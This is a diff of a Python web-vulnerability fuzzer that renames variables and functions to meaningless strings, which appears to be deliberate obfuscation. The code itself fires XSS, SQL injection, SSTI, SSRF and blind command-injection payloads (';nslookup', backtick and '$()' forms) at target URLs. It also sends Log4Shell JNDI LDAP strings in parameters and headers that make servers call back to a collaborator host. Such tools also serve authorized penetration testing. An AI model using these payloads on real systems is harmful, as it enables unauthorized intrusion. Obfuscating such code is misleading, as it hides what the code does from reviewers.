@@ -1,9 +1,9 @@
-red_color = "\033[91m"
-magenta_color = "\033[95m"
+iwgiygwi = "\033[91m"
+hbsyufy = "\033[95m"
 cyan_color = "\033[96m"
-white_color = "\033[97m"
-reset_color = "\033[0m"
-yellow_color="\033[93m"
+cskdhbvksv = "\033[97m"
+eybrebr = "\033[0m"
+vjvjhvjjbvc="\033[93m"
 clear_line = "\033[K"
 
 
@@ -118,13 +118,13 @@ input("\n-- press <enter> to start --\n")
 
 #************************** custom task / cheat codes ******************************
 
-cheat_code=input("\n example: 1.post,2.ssti,3.rce,4.sql,5.xss,6.owasp,7.header_inject(disabled),single,reset (you can use multiple at once) \n"+cyan_color+" tip: type 'header' to turn off header injection(recommended for faster scan)\n\nenter cheatcode to skip those processes:")
+cheat_code=input("\n example: 1.post,2.ssti,3.rce,4.sql,5.xss,6.owasp,7.header inject(disabled),single,reset (you can use multiple at once) \n"+cyan_color+" tip: type 'header' to turn off header injection(recommended for faster scan)\n\nenter cheatcode to skip those processes:")
 cheat_code=cheat_code.lower()
 
 print()
 
 if "only" not in cheat_code:
-    enable_post = enable_ssti = enable_rce = enable_sql = enable_xss = enable_owasp = enable_header_inject = True
+    enable_post = enable_ssti = enable_rce = enable_sql = enable_xss = enable_owasp = enable_hvsjbskhvs = True
     reset_count = single_mode = False
     
     # Check cheat codes and update settings accordingly
@@ -154,7 +154,7 @@ if "only" not in cheat_code:
         print("\t✨ OWASP XSS payloads are disabled")
     
     if "header" in cheat_code or "7" in cheat_code:
-        enable_header_inject = False
+        enable_hvsjbskhvs = False
         print("\t✨ Header injection is disabled")
     
     if "reset" in cheat_code:
@@ -162,13 +162,13 @@ if "only" not in cheat_code:
         print("\t✨ Count will be reset to 0")
     
     if "single" in cheat_code.lower():
-        enable_ssti = enable_owasp = enable_sql = enable_rce = enable_xss = enable_header_inject = False
+        enable_ssti = enable_owasp = enable_sql = enable_rce = enable_xss = enable_hvsjbskhvs = False
         print("\t✨ Only single simple XSS (all others are in disable mode)")
         single_mode = True
 
 else:
     # Handle the case when "only" is present in cheat_code
-    enable_post = enable_ssti = enable_rce = enable_sql = enable_xss = enable_owasp = enable_header_inject = False
+    enable_post = enable_ssti = enable_rce = enable_sql = enable_xss = enable_owasp = enable_hvsjbskhvs = False
     reset_count = single_mode = False
     
     # Check cheat codes and update settings accordingly (opposite of the "not in" block)
@@ -198,7 +198,7 @@ else:
         print("\t✨ OWASP XSS payloads are enabled")
     
     if "header" in cheat_code or "7" in cheat_code:
-        enable_header_inject = True
+        enable_hvsjbskhvs = True
         print("\t✨ Header injection is enabled")
     
     if "reset" in cheat_code:
@@ -208,7 +208,7 @@ else:
 time.sleep(3)
 #***********************************************************************
 
-print(yellow_color+"\nList of All text Files in Current Directory:\n"+white_color)
+print(vjvjhvjjbvc+"\nList of All text Files in Current Directory:\n"+cskdhbvksv)
 file_count=0
 for file in glob.glob("input/with_param/*.txt") :
     file_count+=1
@@ -249,7 +249,7 @@ def fcount(file_count2):
             return file
 #*******************************************************************
 fn=fcount(int(file_count2))
-print(red_color+"\nselected file: ",yellow_color+fn)
+print(iwgiygwi+"\nselected file: ",vjvjhvjjbvc+fn)
 #***** 
 
 
@@ -260,51 +260,51 @@ print("🚀Total loaded urls:",len(Urls))
 
 #*********************+++++++++++++++++++++++++++++++*****************************
 print(cyan_color+" press 0 or 1 to run only with default single parameter\n press -s- to \"set small parameters list\" \n press -M- to \"set medium parameters list\n press -L- to \"set large parameters list\"\n press -ssrf- to \"set ssrf payloads only\"")
-user_param_input=input("✨enter your mode:  - ").lower()
+bswpohob=input("✨enter your mode:  - ").lower()
 
-if "ssrf" in user_param_input:
+if "ssrf" in bswpohob:
     paramdirectory='parameters/parametersSSRF.txt'
 
 
-elif "l" in user_param_input:
+elif "l" in bswpohob:
     paramdirectory='parameters/parametersMax.txt'
-    if "nd" in user_param_input:
+    if "nd" in bswpohob:
         paramdirectory='parameters/parametersMaxND.txt'
         
-elif "m" in user_param_input:
+elif "m" in bswpohob:
     paramdirectory='parameters/parameters100.txt'
-    if "nd" in user_param_input:
+    if "nd" in bswpohob:
         paramdirectory='parameters/parameters100ND.txt'
     
-elif "1" in user_param_input or "0" in user_param_input:
+elif "1" in bswpohob or "0" in bswpohob:
     paramdirectory='parameters/noparameters.txt'
     
-elif "s" in user_param_input:
+elif "s" in bswpohob:
     paramdirectory='parameters/parametersMini.txt'
-    if "nd" in user_param_input:
+    if "nd" in bswpohob:
         paramdirectory='parameters/parametersMiniND.txt'
     
 else:
     paramdirectory='parameters/parameters100.txt'
     
-print(yellow_color+"--selected parameters:",paramdirectory)
+print(vjvjhvjjbvc+"--selected parameters:",paramdirectory)
 
 params_file = open(paramdirectory, 'r')
 params_2= params_file.readlines()
 #*********************+++++++++++++++++++++++++++++++*****************************
 
-user_burp_input=input(cyan_color+"✨enter burp collaborator link or press 'r' to use recent one:") # if it is empty then skip (rce function is at last)
+jkbsjkbds=input(cyan_color+"✨enter burp collaborator link or press 'r' to use recent one:") # if it is empty then skip (rce function is at last)
 
 
-if user_burp_input=="r" or user_burp_input=="R":
-    user_burp_input=str(ID)+"."+user_burp_input
+if jkbsjkbds=="r" or jkbsjkbds=="R":
+    jkbsjkbds=str(ID)+"."+jkbsjkbds
     filecollab= open('xsslogabhi/collaborator/recent_collab.txt', 'r')
-    user_burp_input=filecollab.readline()
-    print(yellow_color+"--successfully loaded recent collaborator link --")
+    jkbsjkbds=filecollab.readline()
+    print(vjvjhvjjbvc+"--successfully loaded recent collaborator link --")
     
-elif len(user_burp_input)!=0 and len(user_burp_input)>5:
-    org_collab=user_burp_input
-    user_burp_input=str(ID)+"."+user_burp_input
+elif len(jkbsjkbds)!=0 and len(jkbsjkbds)>5:
+    org_collab=jkbsjkbds
+    jkbsjkbds=str(ID)+"."+jkbsjkbds
     with open('xsslogabhi/collaborator/recent_collab.txt', 'w') as fcollab:
         fcollab.write(org_collab)
 
@@ -328,22 +328,22 @@ with open('xsslogabhi/temp_stats/'+str(ID)+'.abhi','w') as ID1:
 #************************************ logging into continous_stats *************************************
 if not reset_count:
     try:
-        with open('xsslogabhi/resume_stats/'+fn+'.'+user_param_input,'r') as ID1:
+        with open('xsslogabhi/resume_stats/'+fn+'.'+bswpohob,'r') as ID1:
             temp=ID1.readline()
-            resume_count=int(temp)
+            lolhahhah=int(temp)
             print("💾 previous task has being resumed ...")
     except:
-        with open('xsslogabhi/resume_stats/'+fn+'.'+user_param_input,'w') as ID1:
+        with open('xsslogabhi/resume_stats/'+fn+'.'+bswpohob,'w') as ID1:
             ID1.write("0")
-            resume_count=0
+            lolhahhah=0
 else:
-    with open('xsslogabhi/resume_stats/'+fn+'.'+user_param_input,'w') as ID1:
+    with open('xsslogabhi/resume_stats/'+fn+'.'+bswpohob,'w') as ID1:
         ID1.write("0")
-        resume_count=0
+        lolhahhah=0
         
-    with open('xsslogabhi/unique_stats/'+fn+'_'+user_param_input+'.txt','w') as ID1:
+    with open('xsslogabhi/unique_stats/'+fn+'_'+bswpohob+'.txt','w') as ID1:
         ID1.write("")
-        resume_count=0
+        lolhahhah=0
 
 #**************************************function 2 write error *********************************************************
 def write_error():
@@ -352,7 +352,7 @@ def write_error():
 
 #******************************************************************************************************************
 #**************************************function 3 rce collaborator- just get request ***********************************
-def my_function_rce(payload):
+def hfhfhfrce(payload):
     print("[*]command Payload->",payload)
     req=requests.get(url_for_fuzz.replace("FUZZ",payload),headers=headers,cookies=cookies,timeout=30)
 
@@ -394,7 +394,7 @@ def my_function_ssti(payload):
 #******************************************************************************************************************
 #**************************************function 5 xss owap payload detection ***************************************
 
-def my_function_owaspbypass(payload):
+def dlolddowaspolol(payload):
     print("[*] Payload->",payload)
     req=requests.get(url_for_fuzz.replace("FUZZ",payload),headers=headers,cookies=cookies,timeout=30)
     req1=req #modified
@@ -432,22 +432,22 @@ def my_function_owaspbypass(payload):
 from concurrent.futures import ThreadPoolExecutor
 import itertools
 
-def header_inject(headers, main_url, user_burp_input_with_number, num_threads):
+def hvsjbskhvs(headers, main_url, jkbsjkbds_with_number, num_threads):
     header_values = [
         "%253cabhi%253e%2522%2522<abhi>%22%22",
-        "a;nslookup%20bnslkupH" + user_burp_input_with_number + ";",
-        "a%26%26nslookup%20bnslkpH" + user_burp_input_with_number + "%26%26ls",
-        "${jndi:ldap://byl4j" + user_burp_input_with_number + ":8080/abhi4j}",
-        "$(nslookup%20bnslkpH" + user_burp_input_with_number + ")",
-        "`nslookup bnslkpH" + user_burp_input_with_number + "`"
+        "a;nslookup%20bnslkupH" + jkbsjkbds_with_number + ";",
+        "a%26%26nslookup%20bnslkpH" + jkbsjkbds_with_number + "%26%26ls",
+        "${jndi:ldap://byl4j" + jkbsjkbds_with_number + ":8080/abhi4j}",
+        "$(nslookup%20bnslkpH" + jkbsjkbds_with_number + ")",
+        "`nslookup bnslkpH" + jkbsjkbds_with_number + "`"
     ]
 
     def inject_and_check(header_value):
-        enable_header_inject = True
+        enable_hvsjbskhvs = True
         try:
             requests.get(main_url, headers=headers, timeout=10)
         except:
-            enable_header_inject = False
+            enable_hvsjbskhvs = False
 
         for key in headers:
             if any(keyword in key for keyword in ["Date", "Content-Type", "Connection", "Host", "Content-Length", "Authorization", "Accept-Encoding"]):
@@ -459,12 +459,12 @@ def header_inject(headers, main_url, user_burp_input_with_number, num_threads):
             try:
                 print(f"\tCurrent header: {key}: {modified_headers[key]}              ", end="\r")
 
-                if enable_header_inject:
+                if enable_hvsjbskhvs:
                     response = requests.get(main_url, headers=modified_headers, timeout=30)
                 else:
                     continue
 
-                enable_header_inject = True
+                enable_hvsjbskhvs = True
                 response_text = response.text.lower()
 
                 if '<abhi>""' in response_text:
@@ -485,10 +485,10 @@ def header_inject(headers, main_url, user_burp_input_with_number, num_threads):
 
             except requests.exceptions.Timeout:
                 print("\tHeader exception occurred, Request timed out")
-                enable_header_inject = False
+                enable_hvsjbskhvs = False
             except requests.exceptions.RequestException as e:
                 print(f"\tRequest error: {e}")
-                enable_header_inject = False
+                enable_hvsjbskhvs = False
 
     with ThreadPoolExecutor(max_workers=num_threads) as executor:
         executor.map(inject_and_check, header_values)
@@ -819,7 +819,7 @@ def check_put(url, parameter):
 #*****************************************************************************************************
 if not reset_count: #Unique urls
     try:
-        with open('xsslogabhi/unique_stats/'+fn+'_'+user_param_input+".txt",'r') as ID1:
+        with open('xsslogabhi/unique_stats/'+fn+'_'+bswpohob+".txt",'r') as ID1:
             unique_urls=ID1.readlines()
             print("💾 previously processed unique files found ...")
             unique_urls_flag=True
@@ -850,7 +850,7 @@ if not unique_urls_flag:
                 continue
 
             
-        if "l" not in user_param_input :
+        if "l" not in bswpohob :
             for param in params_1:
                 url_with_param = main_url + "?" + param + "=FUZZ"
                 unique_urls.add(url_with_param)
@@ -867,9 +867,9 @@ if not unique_urls_flag:
             
     print("Total generated urls with different parameters: ",len(unique_urls))
     print("\nplease wait ! saving unique urls into disk ..")
-    with open('xsslogabhi/unique_stats/'+fn+'_'+user_param_input+".txt",'w') as ID1:
+    with open('xsslogabhi/unique_stats/'+fn+'_'+bswpohob+".txt",'w') as ID1:
         ID1.write("")
-    with open('xsslogabhi/unique_stats/'+fn+'_'+user_param_input+".txt",'a') as ID1:
+    with open('xsslogabhi/unique_stats/'+fn+'_'+bswpohob+".txt",'a') as ID1:
         for unique_url in unique_urls:
             ID1.write(unique_url+ '\n')
     print("\n[*]Done saving ✅..")
@@ -883,7 +883,7 @@ headers=headers_basic
 #__________________________________________________________________________ 
 
 
-print("\nTotal loaded urls from disk for scan: ",len(unique_urls)-resume_count)
+print("\nTotal loaded urls from disk for scan: ",len(unique_urls)-lolhahhah)
 count=0
 get_cookies_flag=True
 visited_netloc=""
@@ -894,14 +894,14 @@ delay_time=0
 
 for url_for_fuzz in unique_urls:
     count+=1    
-    if count<=resume_count: # resuming count
+    if count<=lolhahhah: # resuming count
         continue
             
     url_for_fuzz=url_for_fuzz.replace("\n","")
     
     time.sleep(delay_time) # here sleep delay implemented according to 429 status
     
-    print(red_color+"[",count,"]:",reset_color+url_for_fuzz)
+    print(iwgiygwi+"[",count,"]:",eybrebr+url_for_fuzz)
 #___________________________________________________________________________________________________________________________________________________ 
 #____________________________________________________________________________________________________________________________________________________ 
 #____________________________________________________________________________________________________________________________________________________ 
@@ -931,10 +931,10 @@ for url_for_fuzz in unique_urls:
 
             
             print(response)
-            enable_header_inject2=True
-            if main_url not in visited_main_urls_reflection and enable_header_inject and enable_header_inject2:
+            enable_hvsjbskhvs2=True
+            if main_url not in visited_main_urls_reflection and enable_hvsjbskhvs and enable_hvsjbskhvs2:
             
-                header_inject(headers,main_url,str(count)+"c"+str(ID)+"."+user_burp_input,thread_limit) # execute header injection function
+                hvsjbskhvs(headers,main_url,str(count)+"c"+str(ID)+"."+jkbsjkbds,thread_limit) # execute header injection function
                 
             if "429" in str(response):
                 print("! server is blocking the requests ! delaying 60 sec")
@@ -953,7 +953,7 @@ for url_for_fuzz in unique_urls:
                 print("\tplease check Network connection ")
                 break
             print("\t..network connection is good..")
-            enable_header_inject2=False
+            enable_hvsjbskhvs2=False
             continue
             
 
@@ -1078,7 +1078,7 @@ for url_for_fuzz in unique_urls:
                 ref_count2=ref_temp.count("fuzz")+ref_temp.count("FUZZ")+ref_temp.count("Fuzz")                        
                
                 if ref_count==ref_count2:
-                    print(white_color+"no special reflections --> skipping")
+                    print(cskdhbvksv+"no special reflections --> skipping")
                     
                     if "parametersMax" not in paramdirectory and "403" not in str(getreq.status_code) and enable_sql:
                         PL1="' or\'\"'<abhi>"
@@ -1456,12 +1456,12 @@ for url_for_fuzz in unique_urls:
                 PL5="78907890%26%23x003E;%26%23x0003C;%26%23x0003E;%26%23x00003C;%26%23x00003E;%26%23x000003C;%26%23x000003E;%26%23X3C;%26%23X3E;%26%23X03C;%26%23X03E;%26%23X003C;%26%23X003E;%26%23X0003C;%26%23X0003E;%26%23X00003C;%26%23X00003E;%26%23X000003C;09870987" 
                 PL6="78907890%26%23X000003E;%26%23X3C;%26%23X3E;%26%23X03C;%26%23X03E;%26%23X003C;%26%23X003E;%26%23X0003C;%26%23X0003E;%26%23X00003C;%26%23X00003E;%26%23X000003C;%26%23X000003E;\\x3c\\x3e\\x3C\\x3E\\u003c\\u003e\\u003C\\u003E09870987" 
 
-                t1 = threading.Thread(target=my_function_owaspbypass, args=(PL1,))
-                t2 = threading.Thread(target=my_function_owaspbypass, args=(PL2,))
-                t3 = threading.Thread(target=my_function_owaspbypass, args=(PL3,))
-                t4 = threading.Thread(target=my_function_owaspbypass, args=(PL4,))
-                t5 = threading.Thread(target=my_function_owaspbypass, args=(PL5,))
-                t6 = threading.Thread(target=my_function_owaspbypass, args=(PL6,))
+                t1 = threading.Thread(target=dlolddowaspolol, args=(PL1,))
+                t2 = threading.Thread(target=dlolddowaspolol, args=(PL2,))
+                t3 = threading.Thread(target=dlolddowaspolol, args=(PL3,))
+                t4 = threading.Thread(target=dlolddowaspolol, args=(PL4,))
+                t5 = threading.Thread(target=dlolddowaspolol, args=(PL5,))
+                t6 = threading.Thread(target=dlolddowaspolol, args=(PL6,))
 
                 
                 if thread_limit==7:
@@ -1676,24 +1676,24 @@ for url_for_fuzz in unique_urls:
              
 
         #blind rce using collaborator ******************      ******************     ***********************
-        if len(user_burp_input)!=0:
+        if len(jkbsjkbds)!=0:
             value="1"
-            def rcepayload(cmd,user_burp_input2):
+            def jbkbhbrcejhv(cmd,jkbsjkbds2):
                 print("************************************"*2)
-                PL1=(cmd+' '+user_burp_input2+';')
-                PL2=(value+" ; "+cmd+' '+user_burp_input2+' ; ls')
-                PL3=(value+" %26%26 "+cmd+' '+user_burp_input2+' %26%26 ls')
-                PL4=("${jndi:ldap://log4j."+user_burp_input2+':8080/abhi4j}')
-                PL5=(value+" || "+cmd+" "+user_burp_input2+' || ls')
-                PL6=(value+" `"+cmd+" "+user_burp_input2+"` ls")
-                PL7=(value+" $("+cmd+" "+user_burp_input2+") ls")
-                t1 = threading.Thread(target=my_function_rce, args=(PL1,))
-                t2 = threading.Thread(target=my_function_rce, args=(PL2,))
-                t3 = threading.Thread(target=my_function_rce, args=(PL3,))
-                t4 = threading.Thread(target=my_function_rce, args=(PL4,))
-                t5 = threading.Thread(target=my_function_rce, args=(PL5,))
-                t6 = threading.Thread(target=my_function_rce, args=(PL6,))
-                t7 = threading.Thread(target=my_function_rce, args=(PL7,))
+                PL1=(cmd+' '+jkbsjkbds2+';')
+                PL2=(value+" ; "+cmd+' '+jkbsjkbds2+' ; ls')
+                PL3=(value+" %26%26 "+cmd+' '+jkbsjkbds2+' %26%26 ls')
+                PL4=("${jndi:ldap://log4j."+jkbsjkbds2+':8080/abhi4j}')
+                PL5=(value+" || "+cmd+" "+jkbsjkbds2+' || ls')
+                PL6=(value+" `"+cmd+" "+jkbsjkbds2+"` ls")
+                PL7=(value+" $("+cmd+" "+jkbsjkbds2+") ls")
+                t1 = threading.Thread(target=hfhfhfrce, args=(PL1,))
+                t2 = threading.Thread(target=hfhfhfrce, args=(PL2,))
+                t3 = threading.Thread(target=hfhfhfrce, args=(PL3,))
+                t4 = threading.Thread(target=hfhfhfrce, args=(PL4,))
+                t5 = threading.Thread(target=hfhfhfrce, args=(PL5,))
+                t6 = threading.Thread(target=hfhfhfrce, args=(PL6,))
+                t7 = threading.Thread(target=hfhfhfrce, args=(PL7,))
 
                 if thread_limit==7:
                     t1.start()
@@ -1784,29 +1784,29 @@ for url_for_fuzz in unique_urls:
 
                 #********************
                 cmd="nslookup"
-                rcepayload(cmd,"bynslookup"+str(count)+"."+str(ID)+"."+user_burp_input) #launching rce function
+                jbkbhbrcejhv(cmd,"bynslookup"+str(count)+"."+str(ID)+"."+jkbsjkbds) #launching rce function
 
                #********************
                 #cmd="ping"
-                #user_burp_input2="byping"+str(c)+"."+str(ID)+"."+user_burp_input
-                #rcepayload(cmd,user_burp_input2)
+                #jkbsjkbds2="byping"+str(c)+"."+str(ID)+"."+jkbsjkbds
+                #jbkbhbrcejhv(cmd,jkbsjkbds2)
 
 
 
                 #********************
 #                cmd="curl"
-#                rcepayload(cmd,"crl."+user_burp_input)
+#                jbkbhbrcejhv(cmd,"crl."+jkbsjkbds)
 
                 #********************
     #            cmd="start"
-     #           rcepayload(cmd,user_burp_input)
+     #           jbkbhbrcejhv(cmd,jkbsjkbds)
 
 
                 #********************** ssrf **********using same rce func ****************
             print("************************************"*2)
             print(".  ssrf   .")
-            PL7="https://direct"+str(count)+"a."+str(ID)+"."+user_burp_input                
-            t7 = threading.Thread(target=my_function_rce, args=(PL7,))                
+            PL7="https://direct"+str(count)+"a."+str(ID)+"."+jkbsjkbds                
+            t7 = threading.Thread(target=hfhfhfrce, args=(PL7,))                
             t7.start()                 
             #t7.join()
 
@@ -1838,5 +1838,5 @@ for url_for_fuzz in unique_urls:
 
 
 
-    with open('xsslogabhi/resume_stats/'+fn+'.'+user_param_input,'w') as ID1:
+    with open('xsslogabhi/resume_stats/'+fn+'.'+bswpohob,'w') as ID1:
         ID1.write(str(count))
